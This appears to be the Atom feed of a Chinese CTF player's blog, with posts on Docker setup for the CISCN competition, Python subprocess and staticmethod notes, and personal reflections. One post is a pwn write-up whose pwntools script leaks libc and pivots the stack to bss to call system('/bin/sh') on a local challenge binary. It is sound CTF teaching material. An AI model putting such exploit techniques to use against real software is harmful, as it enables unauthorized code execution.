<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>vagrant&#39;s blog</title>
  
  <subtitle>welcome</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bobpanda.github.io/"/>
  <updated>2020-08-31T15:37:23.596Z</updated>
  <id>https://bobpanda.github.io/</id>
  
  <author>
    <name>vagrant</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ciscn Build 踩坑笔记</title>
    <link href="https://bobpanda.github.io/2020/08/31/Ciscn-Build-%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
    <id>https://bobpanda.github.io/2020/08/31/Ciscn-Build-%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-31T14:30:56.000Z</published>
    <updated>2020-08-31T15:37:23.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Ciscn真是个坑爹比赛。各种无聊要求最多，承办方通过Build环节收题，还一大堆无理要求（比如在提供docker镜像的情况下要求压缩包小于150M），但是没办法人家是国字头，惹不起嘛。（x</p><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="1-相关docker命令笔记"><a href="#1-相关docker命令笔记" class="headerlink" title="1.相关docker命令笔记"></a>1.相关docker命令笔记</h2><ol><li><p>从指定的Dockerfile构建docker image:<br><code>docker build -f Dockerfile .</code></p></li><li><p>查看当前的docker image列表：<br><code>docker image ls</code></p></li><li><p>查看当前的docker container列表：<br><code>docker container ls</code></p></li><li><p>查看当前的docker 运行情况：<br><code>docker ps</code></p></li><li><p>删除一个docker镜像：<br><code>docker rmi -f &lt;docker image id&gt;</code><br>注意如果该镜像已经被某些container使用，则需要加入<code>-f</code>指令强制全部删除。</p></li><li><p>从某一个docker镜像启动docker服务：<br><code>docker run -it -d -p 50002:22 -p 8888:8888 &lt;docker image id&gt;</code><br>注意这里的<code>-p</code>指令是将docker中的端口映射到宿主机端口上，如50002:22就是将docker内部的22端口映射到宿主机的50002端口上，这样连接宿主机的50002端口即相当于是使用了docker内部的SSH服务。</p></li><li><p>直接获得一个启动了的docker container 的shell：<br><code>docker exec -it &lt;docker container id&gt; /bin/bash</code></p></li><li><p>启动/关闭一个docker 容器：<br><code>docker start &lt;docker container id&gt;</code><br><code>docker stop &lt;docker container id&gt;</code></p></li><li><p>docker容器和宿主机文件拷贝传输：<br><code>docker cp PATH_outside &lt;docker container id&gt;:PATH_inside</code></p></li></ol><h2 id="2-相关dockerfile中的指令"><a href="#2-相关dockerfile中的指令" class="headerlink" title="2.相关dockerfile中的指令"></a>2.相关dockerfile中的指令</h2><ol><li><p><code>FROM</code> ：指以某个docker镜像为基础构建自己的docker镜像。如果该基础镜像已经存在本地，则直接使用，否则会从网上去Pull。在本次Build环节中我使用的镜像是<code>python:2-slim</code>。这个docker基础只有150M大小，除了提供一个基础的Python环境服务以外什么都不能做。</p></li><li><p><code>RUN</code>：指运行某些指定的bash命令。</p></li><li><p><code>COPY</code>：类似于<code>docker cp</code>命令，从外部环境中拷贝文件到docker中去。</p></li><li><p><code>EXPOSE</code>：暴露某些端口，如22。</p></li></ol><h2 id="3-踩坑日记"><a href="#3-踩坑日记" class="headerlink" title="3.踩坑日记"></a>3.踩坑日记</h2><p>说实话我一开始不知道500多M的docker镜像居然能被7z压缩成150M，真的一直在试图在那个slim的150M什么都没有的docker里面配环境，结果最终是没有成功，不过我还是打算在这里记录一些经验。</p><p>由于该环境没有编译器，<code>apt-get</code>功能也几乎报废，因此在安装pycrypto库时候，需要复制编译好的所有文件，包括动态链接库到docker 中Python的site-package中。但是这样还不行。发现from Crypto.Cipher import AES的时候报错from _AES import *错误，原因是动态链接库名字不对，需要将文件夹中所有的动态链接库名字都改成_AES.so，_DES.so之类。</p><p>装Open-SSH环境时候：需要先下载所有的deb包然后手动安装。命令如下：<br><code>apt-get download $(apt-rdepends openssh-server | grep -v &quot;^ &quot; | sed &#39;s/debconf-2.0/debconf/g&#39;)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Ciscn真是个坑爹比赛。各种无聊要求最多，承办方通过Build环节收题，还一大堆无理要求（比如在提供docker镜像的情况下要求压缩包小于
      
    
    </summary>
    
    
      <category term="Devops" scheme="https://bobpanda.github.io/categories/Devops/"/>
    
    
  </entry>
  
  <entry>
    <title>开发笔记</title>
    <link href="https://bobpanda.github.io/2020/08/09/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    <id>https://bobpanda.github.io/2020/08/09/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-09T04:15:29.000Z</published>
    <updated>2020-08-09T05:53:26.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下最近的开发过程中遇到的一些问题和解决办法。</p><h1 id="Python-静态方法问题"><a href="#Python-静态方法问题" class="headerlink" title="Python 静态方法问题"></a>Python 静态方法问题</h1><p>Python的类方法中，一旦某个方法被声明为静态方法，即加入了修饰符@staticmethod，该方法只能直接访问自己声明的一些变量，不能通过self指针访问类中的实例属性。</p><p>我使用了一个watchdog的轮子实现文件监控，按照文档样例覆写了父类中的on_any_event()方法，且需要使该方法成为静态方法。框架如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span>(<span class="params">FileSystemEventHandler</span>):</span></span><br><span class="line">    controller = <span class="literal">None</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_any_event</span>(<span class="params">event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.is_directory:</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elif</span> event.event_type == <span class="string">&#x27;created&#x27;</span>:</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>其中，有一行语句需要访问调用该类的控制器controller，但是不能通过self.controller访问，需要采用<code>Handler.controller</code>这样的方法访问，同时在外部需要对该controller赋值。例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Handler.controller._model.alter_operation(sql)</span><br></pre></td></tr></table></figure></p><h1 id="子进程调用问题"><a href="#子进程调用问题" class="headerlink" title="子进程调用问题"></a>子进程调用问题</h1><h2 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h2><p>我生成了一个bash脚本，想要在Python程序运行过程中通过subprocess库执行这个shell脚本。于是我采用了<code>subprocess.Popen()</code>方法执行。大致情况如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&quot;import.sh&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;#!/bin/bash&quot;</span>)</span><br><span class="line">f.write(bashcmd)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">process = subprocess.run([<span class="string">&quot;chmod&quot;</span> ,<span class="string">&quot;+x&quot;</span>,<span class="string">&quot;import.sh&quot;</span>])</span><br><span class="line">subprocess.Popen([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&#x27;./import.sh&#x27;</span>])</span><br></pre></td></tr></table></figure><br>问题是，如果在Popen后没有其他的Python语句，该条语句能够正常执行，bash脚本运行正常，但是一旦在此条语句后加入任何的Python语句，如print()，该bash脚本都不能正常工作。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>这其实是个假的解决方案，留有隐患，因为我还不知道这个问题的机理，只是想办法绕过了它。绕过办法很简单，就是把原先写在<code>subprocess.Popen([&quot;/bin/bash&quot;,&#39;./import.sh&#39;])</code>这一行后的所有语句都等价地修改成bash脚本中的内容，这样使其成为最后的一行Python语句，能够正常执行。改天一定要搞清楚这里到底是怎么回事。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;记录一下最近的开发过程中遇到的一些问题和解决办法。&lt;/p&gt;
&lt;h1 id=&quot;Python-静态方法问题&quot;&gt;&lt;a href=&quot;#Python-
      
    
    </summary>
    
    
      <category term="Devops" scheme="https://bobpanda.github.io/categories/Devops/"/>
    
    
  </entry>
  
  <entry>
    <title>stack overflow review</title>
    <link href="https://bobpanda.github.io/2020/08/07/stack-overflow-review/"/>
    <id>https://bobpanda.github.io/2020/08/07/stack-overflow-review/</id>
    <published>2020-08-07T03:01:11.000Z</published>
    <updated>2020-08-07T03:58:32.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些众所周知的原因，最近得要把早已丢弃的pwn捡起来了，某些坑爹比赛密码手没人权（滑稽）。这次，先分析一个简单的栈指针劫持的栈溢出题。</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>32位程序，首先checksec检查下保护，发现pie和canary都没有开启。<br>打开题目，发现漏洞函数vul_function()</p><p><img src= "/img/loading.gif" data-lazy-src="/img/1.png" width="50%" height="50%"></p><p>漏洞点也很明显，最后buf多读了一些，导致在栈上多溢出了0x20-0x18=8位，仅仅刚能够覆盖ebp指针和返回地址，因此不能直接在这里构造ROP链。但是，ELF在bss段初始化生成了一个全局的s，读s的时候可以读入较长的数据。因此利用方法就呼之欲出了，就是在s中先写入构造好的ROP链，然后劫持栈指针指向s的地址执行这些gadgets。</p><p>那么怎么劫持栈指针呢？在intel汇编中有一条指令：<strong>leave</strong>。这条语句约等价于<code>mov esp ebp; pop ebp;</code>。所以我们覆盖的ebp就选择bss段的某个地址，然后找到leave ret的gadget，返回地址覆盖为leave_ret，这样esp就被劫持到bss段了。注意leave指令最后会pop，使栈顶指针增加，因此覆盖的ebp应当是s的实际地址-4。</p><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><ol><li>第一轮ROP先泄露libc的基地址，计算出system地址等。</li><li>第二轮ROP直接调用system函数getshell。</li></ol><h3 id="Exploit："><a href="#Exploit：" class="headerlink" title="Exploit："></a>Exploit：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x08048513</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span></span><br><span class="line"></span><br><span class="line">rs.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">#第一轮泄露write地址</span></span><br><span class="line">rs.send(payload)</span><br><span class="line"></span><br><span class="line">rs.recvuntil(<span class="string">&quot;to say?&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret) <span class="comment">#劫持栈指针</span></span><br><span class="line">rs.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(rs.recv(<span class="number">4</span>))</span><br><span class="line">log.success(write_addr)</span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base = write_addr - libc_write</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh=libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">sh_addr = libc_base+libc_sh</span><br><span class="line">rs.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(main_addr) + p32(sh_addr) <span class="comment">#第二轮getshell</span></span><br><span class="line">rs.send(payload)</span><br><span class="line">rs.recvuntil(<span class="string">&quot;to say?&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret)</span><br><span class="line">rs.send(payload2)</span><br><span class="line">rs.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;由于某些众所周知的原因，最近得要把早已丢弃的pwn捡起来了，某些坑爹比赛密码手没人权（滑稽）。这次，先分析一个简单的栈指针劫持的栈溢出题。&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://bobpanda.github.io/categories/pwn/"/>
    
    
      <category term="stack overflow" scheme="https://bobpanda.github.io/tags/stack-overflow/"/>
    
  </entry>
  
  <entry>
    <title>年中随笔</title>
    <link href="https://bobpanda.github.io/2020/08/05/%E5%B9%B4%E4%B8%AD%E9%9A%8F%E7%AC%94/"/>
    <id>https://bobpanda.github.io/2020/08/05/%E5%B9%B4%E4%B8%AD%E9%9A%8F%E7%AC%94/</id>
    <published>2020-08-05T04:48:39.000Z</published>
    <updated>2020-08-05T11:35:43.173Z</updated>
    
    <content type="html"><![CDATA[<p>到2020年8月5日为止，入CTF坑也接近一年半了。我看着身边的师傅们逐渐都搭建起了自己的博客，而我却一直迟迟未建，也许是因为懒，也许是畏惧搭建博客过于困难。我知道，我一直习惯于偷懒和拖延，但近期发生了这许多事，已经不容许我继续这样浑水摸鱼下去了。</p><p>学习CTF竞赛的过程中，我绝对谈不上废寝忘食，充其量也只能称为“还算认真”。三年失败的高中生活以来，也确实很少有我愿意去认真做的事情，我也一直很清楚，这是我的致命弱点，这也导致我跟不上许多大师傅的脚步。最近WMCTF大获全胜的一战，容易让人飘然忘本，应当在狂欢后正视自身的问题，革命尚未成功，同志仍需努力。</p><p>话已讲完，那么，就以这篇随笔为里程碑，开始一段新的旅程吧。</p><p>PS：最后献上对这些大师傅们的感谢，他们都给了我很大的帮助：<strong>Van1sh, Soreat_u, 0xdktb, coinc1dens, shal10w,  badmonkey, and all 0x401 team-mates.</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;到2020年8月5日为止，入CTF坑也接近一年半了。我看着身边的师傅们逐渐都搭建起了自己的博客，而我却一直迟迟未建，也许是因为懒，也许是畏惧搭建博客过于困难。我知道，我一直习惯于偷懒和拖延，但近期发生了这许多事，已经不容许我继续这样浑水摸鱼下去了。&lt;/p&gt;
&lt;p&gt;学习CTF
      
    
    </summary>
    
    
      <category term="Life" scheme="https://bobpanda.github.io/categories/Life/"/>
    
    
      <category term="随笔" scheme="https://bobpanda.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://bobpanda.github.io/2020/08/04/hello-world/"/>
    <id>https://bobpanda.github.io/2020/08/04/hello-world/</id>
    <published>2020-08-04T14:02:00.975Z</published>
    <updated>2020-08-05T02:35:47.775Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to vagrant’s blog. This is a new start.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to vagrant’s blog. This is a new start.&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="Life" scheme="https://bobpanda.github.io/categories/Life/"/>
    
    
      <category term="随笔" scheme="https://bobpanda.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
